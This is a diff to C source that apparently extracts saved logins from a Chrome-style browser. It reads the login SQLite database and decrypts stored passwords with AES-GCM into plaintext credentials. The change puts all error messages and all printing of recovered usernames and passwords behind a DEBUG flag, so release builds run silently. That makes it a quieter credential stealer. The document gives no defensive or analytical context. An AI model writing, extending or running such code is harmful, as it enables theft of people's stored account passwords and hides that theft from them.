@@ -36,7 +36,9 @@ int chrmm_retrieve_logins(const PWSTR fullPath, int *loginCountOut,
   sqlite3 *db;
   int rc = sqlite3_open16(fullPath, &db);
   if (rc) {
+#ifdef DEBUG
     fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
+#endif
     return EXIT_FAILURE;
   }
 
@@ -46,7 +48,9 @@ int chrmm_retrieve_logins(const PWSTR fullPath, int *loginCountOut,
   sqlite3_stmt *statement;
   rc = sqlite3_prepare_v2(db, query, -1, &statement, 0);
   if (rc != SQLITE_OK) {
+#ifdef DEBUG
     fprintf(stderr, "Failed to execute statement: %s\n", sqlite3_errmsg(db));
+#endif
     sqlite3_close(db);
     *loginsOut = NULL;
     *loginCountOut = 0;
@@ -58,7 +62,9 @@ int chrmm_retrieve_logins(const PWSTR fullPath, int *loginCountOut,
   *loginsOut = (Login *)malloc(capacity * sizeof(Login));
 
   if (!*loginsOut) {
+#ifdef DEBUG
     fprintf(stderr, "Failed to allocate memory for LoginInfo\n");
+#endif
     sqlite3_finalize(statement);
     sqlite3_close_v2(db);
     return EXIT_FAILURE;
@@ -70,7 +76,9 @@ int chrmm_retrieve_logins(const PWSTR fullPath, int *loginCountOut,
       capacity += 10;  // grow the allocated array by this much
       *loginsOut = (Login *)realloc(*loginsOut, capacity * sizeof(Login));
       if (!*loginsOut) {
+#ifdef DEBUG
         fprintf(stderr, "Failed to reallocate memory for LoginInfo\n");
+#endif
         sqlite3_finalize(statement);
         sqlite3_close_v2(db);
         return EXIT_FAILURE;
@@ -93,14 +101,18 @@ int chrmm_retrieve_logins(const PWSTR fullPath, int *loginCountOut,
 
   rc = sqlite3_finalize(statement);
   if (rc != SQLITE_OK) {
+#ifdef DEBUG
     fprintf(stderr, "Failed to finalize statement: %s\n", sqlite3_errmsg(db));
+#endif
     sqlite3_close(db);
     return EXIT_FAILURE;
   }
 
   rc = sqlite3_close_v2(db);
   if (rc != SQLITE_OK) {
+#ifdef DEBUG
     fprintf(stderr, "Failed to close database: %s\n", sqlite3_errmsg(db));
+#endif
     return EXIT_FAILURE;
   }
   return EXIT_SUCCESS;
@@ -115,7 +127,9 @@ int chrmm_decrypt_logins(Login logins[], int loginCount, const BYTE *key,
                          int *credentialCountOut) {
   *credentialsOut = (Credential *)malloc(loginCount * sizeof(Credential));
   if (*credentialsOut == NULL) {
+#ifdef DEBUG
     fprintf(stderr, "Memory allocation failed\n");
+#endif
     return EXIT_FAILURE;
   }
 
@@ -131,14 +145,18 @@ int chrmm_decrypt_logins(Login logins[], int loginCount, const BYTE *key,
 
     BYTE *plaintext = (BYTE *)malloc(ciphertextSize);
     if (plaintext == NULL) {
+#ifdef DEBUG
       fprintf(stderr, "Memory allocation failed\n");
+#endif
       free(*credentialsOut);
       return EXIT_FAILURE;
     }
 
     if (AES_GCM_decrypt(key, nonce, ciphertext, ciphertextSize, NULL, 0, 0,
                         plaintext)) {
+#ifdef DEBUG
       fprintf(stderr, "Decryption failed\n");
+#endif
       free(plaintext);
       free(*credentialsOut);
       return EXIT_FAILURE;
@@ -182,6 +200,7 @@ void free_credentials(Credential credentials[], int count) {
 
 // Pretty print a `Login` struct
 void printLogin(Login login) {
+#ifdef DEBUG
   printf("URL: %s\n", login.url);
   printf("Username: %s\n", login.username);
   printf("Password Block (Hex): ");
@@ -189,11 +208,14 @@ void printLogin(Login login) {
     printf("%02X", (unsigned char)login.passwordBlock[i]);
   }
   printf("\n");
+#endif
 }
 
 // Pretty print a `Credential` struct
 void printCredential(Credential credential) {
+#ifdef DEBUG
   printf("URL: %s\n", credential.url);
   printf("Username: %s\n", credential.username);
   printf("Password: %s\n", credential.password);
+#endif
 }
